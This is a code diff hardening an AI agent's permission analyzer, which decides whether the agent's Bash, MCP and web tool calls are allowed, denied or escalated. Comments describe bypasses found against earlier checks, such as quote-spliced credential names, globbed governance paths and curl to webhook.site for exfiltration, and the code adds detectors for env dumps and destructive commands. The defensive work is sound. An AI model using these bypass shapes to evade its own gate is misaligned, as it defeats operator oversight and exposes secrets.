-        # SEC4 (2026-08-18): tokenized on a quote-collapsed working copy —
+        # Tokenized on a quote-collapsed working copy (2026-08-18) —
         # Bash concatenates directly-adjacent quoted literals ('.en''v' ->
         # .env), which the split-on-quote-chars tokenizer never reconstructs
         # from the raw command. `cmd` itself is untouched; every other check
@@ -849,7 +1286,7 @@ class PermissionAnalyzer:
                     f"bash_credential_path:{hit}",
                     "Use os.environ.get() for secrets. Never reference credential files in Bash.",
                 )
-            # SEC4: a glob token ('.e*', '?env') has no exact basename to
+            # A glob token ('.e*', '?env') has no exact basename to
             # match, but it can still be crafted to expand onto a known
             # credential file. Ask the reverse question via fnmatch.
             glob_hit = _credential_glob_hit(tok)
@@ -870,10 +1307,23 @@ class PermissionAnalyzer:
                 if re.search(r'\b(?:INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|REPLACE)\b', cmd, re.IGNORECASE):
                     is_write = True
         if not is_write:
-            # Detect python/perl writing inline
+            # Detect python/perl writing inline (2026-08-18):
+            # context-mode's ctx_execute/ctx_execute_file carry raw Python
+            # source with no literal "python"/"perl" token anywhere in the
+            # text, so the substring gate never fired for that tool family —
+            # treat it as Python context unconditionally instead of requiring
+            # the token.
             cmd_lower = cmd.lower()
-            if ("python" in cmd_lower or "perl" in cmd_lower) and "open(" in cmd:
+            _py_context = tool in _CTX_MODE_EXEC_TOOLS or "python" in cmd_lower or "perl" in cmd_lower
+            if _py_context and "open(" in cmd:
                 is_write = any(q in cmd for q in ("'w'", '"w"', "'a'", '"a"', "'x'", '"x"'))
+            if not is_write and _py_context and (
+                "write_text(" in cmd or "write_bytes(" in cmd
+                or re.search(r'\bshutil\.(?:copy\w*|move|rmtree)\s*\(', cmd)
+                or re.search(r'\bos\.(?:remove|unlink|rmdir|rename|replace)\s*\(', cmd)
+                or re.search(r'\bsubprocess\.(?:run|Popen|call|check_call|check_output)\s*\(', cmd)
+            ):
+                is_write = True
         if not is_write:
             # Detect cp/mv/rsync/install/ln/dd (incl. sudo/absolute-path prefixes,
             # newline-separated commands) and shutil.copy*/shutil.move,
@@ -890,7 +1340,7 @@ class PermissionAnalyzer:
                re.search(r'\.write_(?:text|bytes)\s*\(', cmd):
                 is_write = True
         if not is_write:
-            # SEC3 (2026-08-18): write primitives that reach a target path
+            # 2026-08-18: write primitives that reach a target path
             # without any shell write operator or a name matched above —
             # found live against governance-path escalation: 'patch -p1',
             # 'git apply', 'git checkout <ref> -- <path>' (the -- form only;
@@ -906,12 +1356,27 @@ class PermissionAnalyzer:
                re.search(r'\bgit\s+apply\b', cmd) or \
                re.search(r'\bgit\s+checkout\b[^|;&\n]*--', cmd) or \
                (_tar_mode and "x" in _tar_mode.group(1).lower()) or \
+               _archive_dest_dirs(cmd) or \
                re.search(r'\btar\b[^|;&\n]*--extract\b', cmd) or \
                re.search(r'\bunzip\b', cmd) or \
                re.search(r'(?:^|[\s;&|])ed\s+\S', cmd):
                 is_write = True
+        if not is_write:
+            # 2026-08-18: sed --in-place, perl -i, interactive
+            # editors, curl/wget -o/-O, and touch/mkdir/chmod/chown/ln all
+            # write or create a target with none of the signs above present.
+            if any(p.search(cmd) for p in _BASH_WRITE_SIGN_PATTERNS):
+                is_write = True
         if is_write:
-            blocked = _blocked_path_hit(cmd)
+            # 2026-08-18: match against the raw command,
+            # the quote/backslash-collapsed command, and every relative
+            # token resolved against the command's effective `cd` cwd — a
+            # plain substring check against `cmd` alone missed
+            # `cd /root/dqiii8/.claude && echo x > settings.json` (the
+            # blocked token never appears literally) and quote/backslash
+            # splicing (`CLA''UDE.md`, `CLA\UDE.md`).
+            _targets = _bash_resolved_write_targets(cmd)
+            blocked = next((h for h in (_blocked_path_hit(t) for t in _targets) if h), None)
             if blocked:
                 return self._deny(
                     tool, cmd,
@@ -922,7 +1387,7 @@ class PermissionAnalyzer:
                 )
             # Governance corpus via shell (v3.5): same policy as the Edit/Write
             # and MCP routes — escalate, never silently allow.
-            gov = _governance_path_hit(cmd)
+            gov = next((h for h in (_governance_path_hit(t) for t in _targets) if h), None)
             if gov:
                 return self._escalate(
                     tool, cmd[:80],
@@ -931,16 +1396,36 @@ class PermissionAnalyzer:
                     f"bash_write_governance_path:{gov}",
                     "Confirm the governance change with the user before writing.",
                 )
-        # 3. Web-egress bypass via Bash curl/wget (SEC5, 2026-08-18) — see
-        # _NETWORK_EGRESS_BASH_RE etc. above for the shapes covered.
+            # Glob-shaped tokens ('CLAUD?.md', '*.local.json') never appear
+            # as a resolved literal path — probe them separately.
+            for raw_tok in _BASH_TOKEN_SPLIT_RE.split(_collapse_adjacent_quotes(cmd)):
+                tok = raw_tok.strip().strip("'\"")
+                bg_hit = _blocked_glob_hit(tok)
+                if bg_hit:
+                    return self._deny(
+                        tool, cmd,
+                        f"Glob token in Bash write would match blocked path '{bg_hit}'.",
+                        "CRITICAL", f"bash_write_blocked_glob:{bg_hit}",
+                        "Reference the file explicitly. Bash cannot bypass path restrictions via globbing.",
+                    )
+                gg_hit = _governance_glob_hit(tok)
+                if gg_hit:
+                    return self._escalate(
+                        tool, cmd[:80],
+                        f"Glob token in Bash write would match governance path '{gg_hit}' — human confirmation required.",
+                        f"bash_write_governance_glob:{gg_hit}",
+                        "Confirm the governance change with the user before writing.",
+                    )
+        # 3. Web-egress bypass via Bash — every socket-opening shape, not just
+        # curl/wget; _NETWORK_EGRESS_BASH_RE above is the list.
         if _NETWORK_EGRESS_BASH_RE.search(cmd):
             secret = _url_secret_hit(cmd)
             if secret:
                 return self._deny(
                     tool, cmd,
-                    f"Command carries credential material ('{secret}') into curl/wget.",
+                    f"Command carries credential material ('{secret}') into a network command.",
                     "CRITICAL", f"bash_web_egress_secret:{secret}",
-                    "Never pass a key/token to curl or wget on the command line.",
+                    "Never pass a key/token to a network command on the command line.",
                 )
             var_match = _SENSITIVE_ENV_VAR_RE.search(cmd)
             if var_match:
@@ -950,7 +1435,7 @@ class PermissionAnalyzer:
                     "to a network tool.",
                     "CRITICAL", "bash_web_egress_secret_envvar",
                     "Never interpolate a *_KEY/*_TOKEN/*_SECRET/*_PASSWORD env "
-                    "var into a curl/wget command.",
+                    "var into a network command.",
                 )
             if _ENV_DUMP_TO_NET_RE.search(cmd):
                 return self._deny(
@@ -958,6 +1443,18 @@ class PermissionAnalyzer:
                     "Command pipes the full process environment into a network tool.",
                     "CRITICAL", "bash_web_egress_env_dump",
                     "Never pipe printenv/env output to curl/wget/nc.",
+                )
+            # Payload-shape check, independent of the destination host: a
+            # request carrying os.environ is an environment dump whether it
+            # goes to a known sink or to an attacker-controlled host that
+            # looks perfectly ordinary.
+            if _PY_ENV_TO_NET_RE.search(cmd):
+                return self._deny(
+                    tool, cmd,
+                    "Command hands the process environment to a network call "
+                    "(os.environ inside an egress call).",
+                    "CRITICAL", "bash_web_egress_env_dump",
+                    "Send only the specific values needed, never os.environ itself.",
                 )
             if _PIPE_TO_SHELL_RE.search(cmd):
                 return self._escalate(
@@ -967,6 +1464,56 @@ class PermissionAnalyzer:
                     "bash_web_egress_pipe_to_shell",
                     "Download to a file, inspect it, then run it explicitly.",
                 )
+            # 2026-08-18: sink-host/opaque-blob reasoning
+            # existed only inside the WebFetch gate — `curl https://webhook.site/x`
+            # bypassed it entirely while `WebFetch https://webhook.site/x`
+            # correctly denied. Extract every URL in the command and run it
+            # through the same host-risk/opaque-blob checks.
+            for _url in re.findall(r"https?://[^\s'\"]+", cmd):
+                try:
+                    _host = urllib.parse.urlparse(_url).hostname or ""
+                except Exception:
+                    _host = ""
+                _risk = _host_egress_risk(_host)
+                if _risk:
+                    _kind, _token = _risk
+                    if _kind in ("sink", "metadata"):
+                        return self._deny(
+                            tool, cmd,
+                            f"Command sends data to '{_token}' — a known "
+                            "exfiltration/metadata endpoint.",
+                            "CRITICAL", f"bash_web_egress_sink_host:{_token}",
+                            "Use the documented API host instead.",
+                        )
+                    return self._escalate(
+                        tool, cmd[:80],
+                        f"Command reaches private/loopback host '{_token}' — human review required.",
+                        f"bash_web_egress_private_host:{_token}",
+                        "Confirm this local/private-network target is intended.",
+                    )
+                _blob = _opaque_blob_hit(_url)
+                if _blob:
+                    return self._escalate(
+                        tool, cmd[:80],
+                        f"Command carries an opaque token ('{_blob[:32]}…') in "
+                        "an outbound URL — possible encoded payload.",
+                        "bash_web_egress_opaque_blob",
+                        "Confirm this is not exfiltrated data before approving.",
+                    )
+            # Sink/metadata hosts named as a bare quoted string rather than a
+            # URL — http.client.HTTPSConnection('webhook.site') and friends.
+            # Only sink/metadata verdicts act here; private-host ESCALATE is
+            # left to the URL sweep to avoid firing on ordinary quoted names.
+            for _bare in _BASH_BARE_HOST_RE.findall(cmd):
+                _risk = _host_egress_risk(_bare)
+                if _risk and _risk[0] in ("sink", "metadata"):
+                    return self._deny(
+                        tool, cmd,
+                        f"Command sends data to '{_risk[1]}' — a known "
+                        "exfiltration/metadata endpoint.",
+                        "CRITICAL", f"bash_web_egress_sink_host:{_risk[1]}",
+                        "Use the documented API host instead.",
+                    )
         return None
 
     def _read_touches_credential(self, tool: str, path: str) -> dict | None:
@@ -1025,7 +1572,7 @@ class PermissionAnalyzer:
             shape is checked: a key pasted into a third-party search backend's
             logs is a disclosure even though nobody chose the recipient.
         Any other MCP search-shaped tool (a `query` key, no `url` key — e.g.
-            mcp__exa__web_search_exa, SEC6, 2026-08-18) is the same case as
+            mcp__exa__web_search_exa) is the same case as
             WebSearch: a third-party backend, no attacker-chosen destination.
         """
         if tool == "WebSearch" or (tool.startswith("mcp__") and inp.get("query") and not inp.get("url")):
@@ -1237,8 +1784,8 @@ class PermissionAnalyzer:
             if claim_deny:
                 return claim_deny
 
-        # Extract Bash command once for all Bash checks (3c, 4, 4b). SEC2
-        # (2026-08-18): mcp__context-mode__ctx_execute* is an arbitrary
+        # Extract Bash command once for all Bash checks (3c, 4, 4b).
+        # 2026-08-18: mcp__context-mode__ctx_execute* is an arbitrary
         # sandboxed-exec surface, allow-listed and actively steered to over
         # Bash by its own tool descriptions, that reached none of the Bash
         # checks below — treated as a Bash-equivalent here rather than left
@@ -1275,7 +1822,7 @@ class PermissionAnalyzer:
         # 3d. Credential enforcement for the read family (mirror of 3c for Bash).
         # Must run before 4a (learned_approvals) so a historically-seen path
         # can never whitelist a credential read.
-        if tool in ("Read", "Grep", "Glob", "mcp__context-mode__ctx_execute_file"):
+        if tool in ("Read", "Grep", "Glob", "mcp__context-mode__ctx_execute_file", "Artifact"):
             try:
                 _read_block = self._read_family_credential_block(tool, inp)
                 if _read_block:
@@ -1289,6 +1836,26 @@ class PermissionAnalyzer:
                     "Retry, or ask the user to check this file manually.",
                 )
 
+        # 3d'. Credential enforcement for MCP read-only tools (2026-08-18) — mcp__filesystem__read_text_file / read_multiple_files
+        # etc. are exempt from the step-3 write check (you must be able to
+        # read CLAUDE.md) but that exemption also skipped the credential
+        # check entirely; _mcp_read_candidate_paths() covers every mcp__*
+        # path-like argument regardless of read/write shape.
+        if tool.startswith("mcp__"):
+            try:
+                for _mp in _mcp_read_candidate_paths(tool, inp):
+                    _cred_block = self._read_touches_credential(tool, _mp)
+                    if _cred_block:
+                        return _cred_block
+            except Exception as _mce:
+                log.warning("permission_analyzer: MCP credential check failed: %s", _mce)
+                return self._deny(
+                    tool, str(detail)[:80],
+                    "Internal analyzer error during MCP credential check — denying as precaution.",
+                    "HIGH", "analyzer_internal_error",
+                    "Retry, or ask the user to perform this call manually.",
+                )
+
         # 3e. Egress enforcement for the web family (v3.4). Same placement rule
         # as 3c/3d: BEFORE 4a (learned_approvals), so a repeatedly-attempted
         # exfiltration URL can never be auto-whitelisted past the gate.
@@ -1296,11 +1863,33 @@ class PermissionAnalyzer:
         # is settings.json-allowed via the `mcp__*` glob AND is this system's
         # *documented default* fetcher (web-research-tools.md), so gating only
         # the built-in WebFetch would leave the primary path wide open.
+        # `urls` (plural, e.g. firecrawl_batch_scrape) is checked
+        # the same way — one item at a time — since the trigger condition
+        # only ever looked at the singular `url`/`query` keys before.
         if tool in ("WebFetch", "WebSearch") or (
-            tool.startswith("mcp__") and (inp.get("url") or inp.get("query"))
+            tool.startswith("mcp__") and (inp.get("url") or inp.get("query") or inp.get("urls"))
         ):
             try:
-                _web_block = self._web_egress_block(tool, inp)
+                # Every URL the call carries, never one key in place of the
+                # other (2026-08-18): `urls` as a bare string used to iterate
+                # nothing useful, and a benign `url` alongside a malicious
+                # `urls` list disabled the list scan entirely.
+                _url_targets: list = []
+                if inp.get("url"):
+                    _url_targets.append(inp.get("url"))
+                _urls_list = inp.get("urls")
+                if isinstance(_urls_list, (list, tuple)):
+                    _url_targets.extend(_urls_list)
+                elif isinstance(_urls_list, str) and _urls_list:
+                    _url_targets.append(_urls_list)
+                _web_block = None
+                if _url_targets:
+                    for _u in _url_targets:
+                        _web_block = self._web_egress_block(tool, {**inp, "url": str(_u or "")})
+                        if _web_block:
+                            break
+                else:
+                    _web_block = self._web_egress_block(tool, inp)
                 if _web_block:
                     return _web_block
             except Exception as _wee:
@@ -1312,10 +1901,54 @@ class PermissionAnalyzer:
                     "Retry, or ask the user to fetch this URL manually.",
                 )
 
-        # 4. Always-CRITICAL commands (no mode exception, no ALLOWED_DELETIONS)
-        if tool == "Bash" or tool in _CTX_MODE_EXEC_TOOLS:
+        # 3f. Generic secret-in-payload catch-all for MCP tools (2026-08-18). mcp__claude_ai_Google_Drive__create_file/share_file
+        # and any other MCP tool carrying free-form content have no url/
+        # query/path key at all, so none of 3-3e ever inspect them. Last,
+        # tool-agnostic line of defense: no recognised secret shape may
+        # appear anywhere in a mcp__* call's arguments.
+        if tool.startswith("mcp__"):
             try:
-                cmd = _bash_cmd
+                _payload_text = json.dumps(inp, ensure_ascii=False, default=str)
+            except Exception:
+                _payload_text = str(inp)
+            _secret = _url_secret_hit(_payload_text)
+            if _secret:
+                return self._deny(
+                    tool, _payload_text[:80],
+                    f"MCP call carries credential material ('{_secret}') in its arguments.",
+                    "CRITICAL", f"mcp_payload_secret:{_secret}",
+                    "Never pass a key/token as an MCP tool argument — read it via "
+                    "os.environ.get() only where the code that needs it runs.",
+                )
+
+        # SQL text carried by any MCP tool (mcp__dqiii8-db__execute and
+        # friends) is a Bash-equivalent surface for the CRITICAL/HIGH_RISK
+        # pattern checks below (2026-08-18) — DROP TABLE/DROP
+        # DATABASE/mass-DELETE previously reached the DB unchecked because
+        # steps 4/4b only ever looked at Bash/ctx_execute text.
+        if tool.startswith("mcp__"):
+            _mcp_sql_text = " ".join(
+                str(inp.get(k, "")) for k in ("sql", "query", "statement") if inp.get(k)
+            )
+        else:
+            _mcp_sql_text = ""
+        _pattern_scope = tool == "Bash" or tool in _CTX_MODE_EXEC_TOOLS or bool(_mcp_sql_text)
+
+        # 4. Always-CRITICAL commands (no mode exception, no ALLOWED_DELETIONS)
+        if _pattern_scope:
+            try:
+                cmd = _bash_cmd or _mcp_sql_text
+                # rm -rf / (and flag-order variants) targeting the exact root
+                # filesystem — checked ahead of the regex list.
+                for _tgt in _rm_destructive_targets(cmd):
+                    if _tgt == "/":
+                        return self._deny(
+                            tool, cmd,
+                            f"Catastrophic command blocked: recursive-force rm "
+                            f"targeting root filesystem: '{cmd[:80]}'",
+                            "CRITICAL", "critical_pattern:rm_rf_root",
+                            "This command is irreversible and catastrophic.",
+                        )
                 for pattern in CRITICAL_PATTERNS:
                     if re.search(pattern, cmd, re.IGNORECASE):
                         return self._deny(
@@ -1333,38 +1966,78 @@ class PermissionAnalyzer:
                     "Retry with a valid command string.",
                 )
 
-        # 4a. learned_approvals — only AFTER blocked-path + CRITICAL checks.
-        # A historically-safe pattern can never override a CRITICAL deny.
-        if self._is_learned_safe(tool, detail):
-            return self._approve(
-                "Pattern approved by history", "LOW", "learned_approval"
-            )
-
         # 4b. High-risk commands with ALLOWED_DELETIONS exception
-        if tool == "Bash" or tool in _CTX_MODE_EXEC_TOOLS:
+        if _pattern_scope:
             try:
-                cmd = _bash_cmd
+                cmd = _bash_cmd or _mcp_sql_text
+                # rm -rf /anything, ~, $HOME — flag-order/style agnostic
+                # replacing the old literal HIGH_RISK_PATTERNS
+                # entries.
+                _rm_hits = _rm_destructive_targets(cmd)
+                if _rm_hits and not self._rm_target_is_allowed(cmd):
+                    if DQIII8_MODE == "autonomous":
+                        return self._deny(
+                            tool, cmd,
+                            f"High-risk command in autonomous mode: {cmd[:80]}",
+                            "HIGH", "high_risk_pattern:rm_rf",
+                            "Use ALLOWED_DELETIONS or run in supervised mode.",
+                        )
+                    else:
+                        return self._deny(
+                            tool, cmd,
+                            f"Blocked command: '{cmd[:80]}'",
+                            "CRITICAL", "high_risk_pattern:rm_rf",
+                            "This command is destructive and irreversible.",
+                        )
+                # Literal-vs-literal always-true DELETE predicate (`WHERE 2>1`).
+                # Not expressible as a HIGH_RISK_PATTERNS regex — the truth of
+                # the comparison has to be computed, see _sql_literal_tautology.
+                _lit = _sql_literal_tautology(cmd)
+                if _lit:
+                    return self._deny(
+                        tool, cmd,
+                        f"Unbounded DELETE on an audit table: predicate "
+                        f"'{_lit}' is always true — '{cmd[:80]}'",
+                        "CRITICAL", "high_risk_pattern:sql_literal_tautology",
+                        "Bound the DELETE with a real predicate, or use "
+                        "bin/core/action_log.py for legitimate writes.",
+                    )
                 for pattern in HIGH_RISK_PATTERNS:
                     if re.search(pattern, cmd, re.IGNORECASE):
                         is_safe_deletion = self._rm_target_is_allowed(cmd)
                         if is_safe_deletion:
                             break
+                        _rule = _HIGH_RISK_RULE_IDS.get(pattern, pattern)
                         if DQIII8_MODE == "autonomous":
                             return self._deny(
                                 tool, cmd,
                                 f"High-risk command in autonomous mode: {cmd[:80]}",
-                                "HIGH", f"high_risk_pattern:{pattern}",
+                                "HIGH", f"high_risk_pattern:{_rule}",
                                 "Use ALLOWED_DELETIONS or run in supervised mode.",
                             )
                         else:
                             return self._deny(
                                 tool, cmd,
                                 f"Blocked command: '{cmd[:80]}'",
-                                "CRITICAL", f"high_risk_pattern:{pattern}",
+                                "CRITICAL", f"high_risk_pattern:{_rule}",
                                 "This command is destructive and irreversible.",
                             )
             except Exception as _he:
                 log.warning("permission_analyzer: HIGH_RISK pattern check failed: %s", _he)
+                return self._deny(
+                    tool, str(inp.get("command", ""))[:80],
+                    "Internal analyzer error during high-risk check — denying as precaution.",
+                    "HIGH", "analyzer_internal_error",
+                    "Retry with a valid command string.",
+                )
+
+        # 4a. learned_approvals — only AFTER blocked-path + CRITICAL + HIGH_RISK
+        # checks. A historically-safe pattern can never override
+        # any of those denies, even latently.
+        if self._is_learned_safe(tool, detail):
+            return self._approve(
+                "Pattern approved by history", "LOW", "learned_approval"
+            )
 
         # 5. Autonomous mode — auto-approve standard tools (after checks)
         if DQIII8_MODE == "autonomous" and tool in AUTO_APPROVE_TOOLS:
@@ -1679,19 +2352,30 @@ def record_decision(tool: str, inp: dict, result: dict) -> None:
         log.warning("permission_analyzer: record_decision DB write failed: %s", e, exc_info=True)
 
 
-def record_rejection(tool: str, inp: dict, result: dict) -> None:
+def record_rejection(tool: str, inp: dict, result: dict, session_id: str | None = None) -> None:
     """
     Records DENY and ESCALATE in two channels:
     Channel 1 — DB: permission_decisions table
     Channel 2 — JSON mailbox: tasks/permission_rejection.json (read by OrchestratorLoop)
     FIX A: added JSON channel.
+
+    session_id (2026-08-18): defaults to the module-level
+    SESSION_ID constant, which is only ever set from CLAUDE_SESSION_ID — a
+    variable never populated anywhere in settings.json's env, so every row
+    this function ever wrote landed under session_id='unknown'
+    (176 DENY + 23 ESCALATE rows, confirmed). That silently broke
+    _check_repeat_rejections()'s loop-breaker, which filters
+    `WHERE session_id = ?` using the REAL per-invocation session id passed
+    into evaluate(). Callers (pre_tool_use.py) already have that real id —
+    pass it through instead of relying on the broken env-var fallback.
     """
     if result["decision"] not in ("DENY", "ESCALATE"):
         return
 
+    _session = session_id or SESSION_ID
     entry = {
         "timestamp": datetime.now().isoformat(),
-        "session_id": SESSION_ID,
+        "session_id": _session,
         "tool_name": tool,
         # url/query included so a blocked egress attempt reaches the operator
         # with the actual destination instead of an empty string. Deliberately
@@ -1727,7 +2411,7 @@ def record_rejection(tool: str, inp: dict, result: dict) -> None:
             VALUES (?, ?, ?, ?, ?, ?, ?, ?)
             """,
             (
-                SESSION_ID,
+                _session,
                 tool,
                 entry["action_detail"],
                 entry["decision"],
